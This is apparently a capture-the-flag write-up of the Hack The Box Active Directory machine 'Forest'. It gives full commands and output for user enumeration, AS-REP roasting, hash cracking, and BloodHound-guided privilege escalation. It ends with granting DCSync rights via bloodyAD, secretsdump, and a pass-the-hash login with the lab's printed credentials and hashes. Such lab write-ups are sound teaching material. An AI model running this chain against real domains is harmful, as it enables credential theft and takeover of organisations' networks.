# Introduction

Forest is an easy active directory based machine that involves ASREPRoasting to a get a hash which we can crack to get our first set of credentials. After gaining some initial credentials, I run a bloodhound ingestor in order to understand what type of AD envrionment I am dealing with. I can also use these credentials to login into the box using WinRM. Using what I learned from bloodhound, I add DCSync privileges to myself and exploit the box to get administrator access.


# Enumeration

## Port Enumeration

Target IP Address: 10.129.108.125

We run an intial port scan in order to find out what we are dealing with.  

```bash
$ nmap -T4 -F -oA scans/initial 10.129.156.161 -Pn -v
```

This gives us the following output:
```bash
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

So, the target machine appears to be an active directory box with the usual services running.

Firstly, I can generate the `/etc/hosts` file using nxc.

```bash
~/htb/boxes/OSCP-PREP/Forest ❯ nxc smb 10.129.8.176 -u '' -p ''  --generate-hosts-file scans/hosts

10.129.8.176     FOREST.htb.local htb.local FOREST
```

###### Hint

The reason for using nxc to generate the /etc/hosts file is because when I myself write down an entry in /etc/hosts I do not follow the convention. This is also true for most other people. This was mostly popularised by 0xdf and ippsec, and it was very quickly patched by the developers of nxc.

#### SMB Enumeration

I move onto enumerating SMB by checking for null authentication and guest access.

```bash
~/htb/boxes/OSCP-PREP/Forest ❯ nxc smb 10.129.8.176 -u '' -p ''  --shares                         
SMB         10.129.8.176    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.8.176    445    FOREST           [+] htb.local\: 
SMB         10.129.8.176    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
~/htb/boxes/OSCP-PREP/Forest ❯ nxc smb 10.129.8.176 -u 'guest' -p ''  --shares
SMB         10.129.8.176    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.8.176    445    FOREST           [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
```

I am not surprised that I can't use them. Moving on, we do manage to learn a few bits of information.

Mainly that the target is running Windows 10 Server 2016 Build 14393 x64

Running enum4linux we also learn a few more important details like the following:

- Domain SID: S-1-5-21-3072663084-364016917-1341370565
- Password history length: 24
- Minimum password length: 7

#### Kerberos enumeration (User enumeration)

It doesn't seem like I can find anything more interesting with SMB, so I quickly move onto Kerberos.

We can enumerate usernames using kerbrute's userenum feature. Kerbrute also has a `-o` feature to output the content to a log file, so there is really no point in using tee `^_^`.

```
~/htb/boxes/OSCP-PREP/Forest 1m 10s ❯ kerbrute userenum --dc FOREST.htb.local -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  | tee scans/kerbrute.out


2025/03/22 17:35:23 >  [+] VALID USERNAME:       mark@htb.local
2025/03/22 17:35:26 >  [+] VALID USERNAME:       andy@htb.local
2025/03/22 17:35:55 >  [+] VALID USERNAME:       forest@htb.local
2025/03/22 17:36:18 >  [+] VALID USERNAME:       administrator@htb.local
2025/03/22 17:38:27 >  [+] VALID USERNAME:       sebastien@htb.local
2025/03/22 17:42:11 >  [+] VALID USERNAME:       santi@htb.local
2025/03/22 17:42:56 >  [+] VALID USERNAME:       lucinda@htb.local

[duplicates removed]

```

I do maange to find out a bunch of usernames, but since it's case-insensitive, I removed the duplicates from the output because that's just redundant.


# Initial Access

#### Getting some credz

We don't really have any credentials to speak of, so a kerberoasting attack is off the table currently. Here is what the output would look like if you ran it anyway:

```
~/htb/boxes/OSCP-PREP/Forest ❯ impacket-GetUserSPNs htb.local/ -dc-ip 10.129.8.176                                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

What we can check is to see if any user has non-preauth AS_REP. We can do this by using impacket's handy `impacket-GetNPUsers`. I assume that NP stands for no preauth.


```
~/htb/boxes/OSCP-PREP/Forest ❯ impacket-GetNPUsers htb.local/ -request -dc-ip 10.129.8.176

$krb5asrep$23$svc-alfresco@HTB.LOCAL:786f2c92f1f3232aca14adb1a4bcefbb$d1ce68f6b73a7b38230f03ba3c479520a7ff84c19dbe3a098068c158edda88be28b71fa1f7adc002dad2e01416cbf795202c6a2fd6c657cede52115e022d7df75a48cc79953498e7823e8ada7772783455b7da11222b13155507b68e0772d9ace3b15cd44a5d0de91c539841a19865c81de2aa6f39c770f120ad84eaea879abe2c0e68cbabcbd3ceb98c4a2bcffe0121b7deb9b8df69307685441e135f82e5a230b535fbc395bda6b62c79746e2bf85ddc8093fc6df2710a5e665a551651e248abd32ff1fbf8b8ceaf414501ddf07d2af0afcef28454772e447ccdbd550e842cae9fc3b2bf65
```

We do manage to find a hash belonging to svc-alfresco, we can use hashcat to crack it.

Hashcat mode is: 18200

Running the following:
```
hashcat -a 0 -m 18200 ./hash ./rockyou.txt
```

This eventually cracks to the following password of `s3rvice`

So the first pair of credentials that we have are:

```
svc-alfresco / s3rvice
```

#### Bloodhound analysis 

Using the credentials we managed to discover I run a bloodhound-ingestor to gather data.
```
~/htb/boxes/OSCP-PREP/Forest ❯ bloodhound-python -d htb.local -u 'svc-alfresco' -p 's3rvice' --zip -c All -ns 10.129.8.176
[...snip...]
```

###### Hint

I have since stopped using this particular ingestion agent, because most newer boxes now have the CE (Community Edition) of bloodhound. There is a new version of this particular ingestor by the name of bloodhound-ce-python, but I just use rusthound-ce myself.
https://github.com/g0h4n/RustHound-CE

I have found that bloodhound-python might miss some things on this box, so I recommend that you also use rusthound-ce. 

Back to the box.

We learn that svc-alfresco is part of the Service Accounts group (this is also denoted by the fact that it has a username prefix of svc) which itself is a member of the Privileged IT Accounts which are then a member of the Remote Management Users and Account Operator groups. 

To put it simply:
```
svc-alfresco - member of - > Service Accounts (Group) - member of - > Privileged IT Accounts (Group)|- member of - 
													|
													-> Remote Management Users (Group)
													|							
													-> Account Operator (Group)
```
This means we can use winrm to login into the box.

# Post-Exploitation

#### Privilege escalation

Analysing the bloodhound output more carefully we find that account operators has GenericAll permissions on the Exchange Windows Permisions (Group) which then has WriteDacl on -> HTB.LOCAL.

This is a pretty basic AD chain that we can exploit. I will do this in steps

`1.` Exploiting GenricAll permissions on Exchange Windows Permisions

'GenricAll permissions' is a fancy term that basically means that wen can do whatever we want with this AD object. The first things that comes to find is that I can simply add myself to this group. There are multiple ways to do this, but I will use bloodyAD since I like the tool very much and find it useful.

###### Hint
If you are unfamiliar with I highly recommend getting to know it well. It will help you a lot in attacking AD environments. 

Back to the box.

The syntax is pretty easy to understand, so I don't believe that it requires any explanation.

```bash
~/htb/boxes/OSCP-PREP/Forest ❯ bloodyAD --host FOREST.htb.local -d htb.local -u 'svc-alfresco' -p 's3rvice' add groupMember "Exchange Windows Permissions" svc-alfresco
[+] svc-alfresco added to Exchange Windows Permissions
```

Moving onto step 2 now.

`2.` Exploiting WriteDacl on HTB.LOCAL

Now we can abuse the permissions this group has to grant our user DcSync privileges. Once again I am using bloodyAD
```
~/htb/boxes/OSCP-PREP/Forest ❯ bloodyAD --host FOREST.htb.local -d htb.local -u 'svc-alfresco' -p 's3rvice' add dcsync svc-alfresco
[+] svc-alfresco is now able to DCSync
```

We can now abuse this ability to sync domain controllers by tricking the target into thinking we are another DC. This is a geniuine feature used in AD environments that we will abuse for funz. This allows us to get all the credentialz we need using the MS-DRSR protocol.

Now we can use secretsdump to get all the hashes!

```
~/htb/boxes/OSCP-PREP/Forest ❯ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'FOREST.htb.local'

```

We can now use evil-winrm to login to the box:

```
~/htb/boxes/OSCP-PREP/Forest ❯ evil-winrm -i htb.local -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'

That's the box! I hope you enjoyed it :)
